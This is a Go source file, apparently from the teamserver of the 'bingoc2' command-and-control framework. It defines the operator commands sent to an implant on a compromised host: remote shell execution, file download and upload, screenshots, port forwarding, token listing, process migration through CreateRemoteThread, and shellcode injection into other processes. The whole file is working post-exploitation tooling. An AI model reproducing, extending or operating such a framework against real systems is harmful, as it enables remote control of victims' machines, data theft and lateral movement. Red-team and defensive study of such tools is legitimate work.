package commands

import (
	"fmt"
	"os"
	"path"
	"time"

	bingo_errors "github.com/bingoc2/bingoc2-framework/teamserver/errors"
	grumble "github.com/bingoc2/bingoc2-framework/teamserver/grumble_modified"
	"github.com/bingoc2/bingoc2-framework/teamserver/hellsgopher"
	"github.com/bingoc2/bingoc2-framework/teamserver/version"
	yamlstructs "github.com/bingoc2/bingoc2-framework/teamserver/yaml_structs"
	"gopkg.in/yaml.v3"
)

func SendTask(agentid string, task string, taskData string) error {
	sessionData, err := yamlstructs.ReadSessionYaml(agentid)
	if err != nil {
		return err
	}

	sessionData.Tasks = append(sessionData.Tasks, fmt.Sprintf("%s - %s", task, taskData))

	// write new data
	yamlData, err := yaml.Marshal(&sessionData)
	if err != nil {
		return err
	}

	os.WriteFile(version.SESSION_DATA_DIR+agentid+".yaml", yamlData, 0666)

	return nil
}

func Use(c *grumble.Context) error {
	agentId := c.Args.String("agentid")

	// get sessionData
	sessionData, err := yamlstructs.ReadSessionYaml(agentId)
	if err != nil {
		return err
	}

	// check if session alive
	maxCallBackTime := sessionData.Sleep + sessionData.Jitter + 1

	if time.Now().After(sessionData.LastCallBack.Add(time.Duration(maxCallBackTime) * time.Second)) {
		return bingo_errors.ErrDeadSession
	}

	// register new prompt
	c.App.SetPrompt(fmt.Sprintf("[%s] bingoc2 (%s@%s)> ", agentId, sessionData.Username, sessionData.Hostname))

	// delete old commands
	DeleteAllCommands(c)

	// register new commands
	RegisterNewCommands(c, agentId)

	return nil
}

func RegisterNewCommands(c *grumble.Context, agentid string) {
	c.App.AddCommand(&grumble.Command{
		Name:    "background",
		Help:    "exit from session (does not kill session)",
		Aliases: []string{"bg", "back"},
		Run: func(c *grumble.Context) error {
			DeleteAllCommands(c)
			RegisterMainCommands(c.App)
			c.App.SetPrompt("[client] bingoc2> ")
			return nil
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "shell",
		Help: "run a shell command",
		Args: func(a *grumble.Args) {
			a.String("cmd", "shell command to execute; commands with spaces need to be in quotes")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "shell", c.Args.String("cmd"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "whoami",
		Help: "get current user",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "whoami", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "hostname",
		Help: "get current hostname",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "hostname", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "sleep",
		Help: "change how long the agent sleeps in-between checkins (in seconds)",
		Args: func(a *grumble.Args) {
			a.String("sleep", "(in seconds)")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "sleep", c.Args.String("sleep"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "download",
		Help: "download a file from the target to teamserver",
		Args: func(a *grumble.Args) {
			a.String("path", "path to file on target")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "download", c.Args.String("path"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "upload",
		Help: "upload file from teamserver to target",
		Args: func(a *grumble.Args) {
			a.String("uPath", "path to file to upload")
			a.String("dPath", "path to upload file to on target")
		},
		Run: func(c *grumble.Context) error {
			// move file to ./files dir
			hellsgopher.CopyFile(c.Args.String("uPath"), "./files/"+path.Base(c.Args.String("uPath")))

			return SendTask(agentid, "upload", path.Base(c.Args.String("uPath"))+" "+c.Args.String("dPath"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name:    "cat",
		Help:    "see contents of a file",
		Aliases: []string{"bat", "type"},
		Args: func(a *grumble.Args) {
			a.String("file", "path to file")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "cat", c.Args.String("file"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name:    "ls",
		Help:    "list contents of directory",
		Aliases: []string{"dir"},
		Args: func(a *grumble.Args) {
			a.String("path", "dir to read", grumble.Default("./"))
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "ls", c.Args.String("path"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "ps",
		Help: "list running processes",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "ps", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name:    "ifconfig",
		Help:    "get network interfaces",
		Aliases: []string{"ipconfig"},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "ifconfig", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "kill",
		Help: "kill a process",
		Args: func(a *grumble.Args) {
			a.String("pid", "process id to kill")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "kill", c.Args.String("pid"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "die",
		Help: "kill session and delete agent off target",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "died", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "screenshot",
		Help: "capture a screenshot of target",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "screenshot", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "pwd",
		Help: "present working directory",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "pwd", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "cd",
		Help: "change directories",
		Args: func(a *grumble.Args) {
			a.String("path", "path to change to")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "cd", c.Args.String("path"))
		},
	})

	portFwdCmd := &grumble.Command{
		Name: "portfwd",
		Help: "manage port forwarding rules",
	}
	c.App.AddCommand(portFwdCmd)

	portFwdCmd.AddCommand(&grumble.Command{
		Name: "add",
		Help: "add port forwarding rule",
		Flags: func(f *grumble.Flags) {
			f.String("l", "lport", "", "local port of the machine to listen on")
			f.String("p", "rport", "", "remote port to forward to")
			f.String("r", "rhost", "", "host to forward to")
		},
		Run: func(c *grumble.Context) error {
			lport := c.Flags.String("lport")
			rport := c.Flags.String("rport")
			rhost := c.Flags.String("rhost")
			return SendTask(agentid, "portfwd", "add / "+lport+" / "+rport+" / "+rhost)
		},
	})

	portFwdCmd.AddCommand(&grumble.Command{
		Name: "del",
		Help: "delete port forwarding rule",
		Args: func(a *grumble.Args) {
			a.String("id", "id of port forwarding rule")
		},
		Run: func(c *grumble.Context) error {
			id := c.Args.String("id")
			return SendTask(agentid, "portfwd", "del / "+id)
		},
	})

	portFwdCmd.AddCommand(&grumble.Command{
		Name: "list",
		Help: "list all port forwarding rules",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "portfwd", "list")
		},
	})

	portFwdCmd.AddCommand(&grumble.Command{
		Name:    "clear",
		Help:    "clear all port forwarding rules",
		Aliases: []string{"flush"},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "portfwd", "clear")
		},
	})

	taskCmd := &grumble.Command{
		Name: "tasks",
		Help: "manage tasks for the current session",
	}
	c.App.AddCommand(taskCmd)

	taskCmd.AddCommand(&grumble.Command{
		Name: "list",
		Help: "view a list of tasks currently in queue",
		Run: func(c *grumble.Context) error {
			return listTask(agentid, c)
		},
	})

	taskCmd.AddCommand(&grumble.Command{
		Name: "del",
		Help: "remove a task from queue",
		Args: func(a *grumble.Args) {
			a.Int("taskid", "id of task to remove")
		},
		Run: func(c *grumble.Context) error {
			return deleteTask(agentid, c)
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "info",
		Help: "get basic info about the system",
		Run: func(c *grumble.Context) error {
			return SessionInfo(agentid, c)
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "getuid",
		Help: "get the uid",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "getuid", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "getgid",
		Help: "get the gid",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "getgid", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "getpid",
		Help: "get the current pid",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "getpid", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "mv",
		Help: "move or rename file",
		Args: func(a *grumble.Args) {
			a.String("source", "source path")
			a.String("destination", "destination path")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "mv", c.Args.String("source")+" -- "+c.Args.String("destination"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "cp",
		Help: "copy file",
		Args: func(a *grumble.Args) {
			a.String("source", "source path")
			a.String("destination", "destination path")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "cp", c.Args.String("source")+" -- "+c.Args.String("destination"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "netstat",
		Help: "print network connection information",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "netstat", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "rm",
		Help: "remove file or directory",
		Args: func(a *grumble.Args) {
			a.String("path", "path to remove")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "rm", c.Args.String("path"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "mkdir",
		Help: "make a directory",
		Args: func(a *grumble.Args) {
			a.String("path", "path to dir to make")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "mkdir", c.Args.String("path"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name:      "impersonate",
		Help:      "impersonate a logged on user",
		HelpGroup: "Windows",
	})

	c.App.AddCommand(&grumble.Command{
		Name: "tokens",
		Help: "list accessable tokens",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "tokens", "list")
		},
		HelpGroup: "Windows",
	})

	c.App.AddCommand(&grumble.Command{
		Name:      "token-info",
		Help:      "get info about the current token",
		HelpGroup: "Windows",
	})

	c.App.AddCommand(&grumble.Command{
		Name:      "enable-privs",
		Help:      "enable all privileges for the current token",
		HelpGroup: "Windows",
	})

	c.App.AddCommand(&grumble.Command{
		Name: "migrate",
		Help: "migrate into remote process using CreateRemoteThread; note this will not close the current process unless -c is specified (this is risky since if the process you inject to is close, you session will end)",
		Args: func(a *grumble.Args) {
			a.String("pid", "process to inject into")
		},
		Flags: func(f *grumble.Flags) {
			f.Bool("c", "close", false, "close your current session/process after a successful injection")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "migrate", c.Args.String("pid")+" -- "+fmt.Sprint(c.Flags.Bool("close")))
		},
		HelpGroup: "Windows",
	})

	c.App.AddCommand(&grumble.Command{
		Name: "inject",
		Help: "inject shellcode into Remote Process",
		Args: func(a *grumble.Args) {
			a.String("shellcode", "shellcode to use")
			a.String("pid", "process to inject into")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "inject", c.Args.String("shellcode")+" -- "+c.Args.String("pid"))
		},
		HelpGroup: "Windows",
	})
}

func DeleteAllCommands(c *grumble.Context) {
	c.App.Commands().RemoveAll()
}
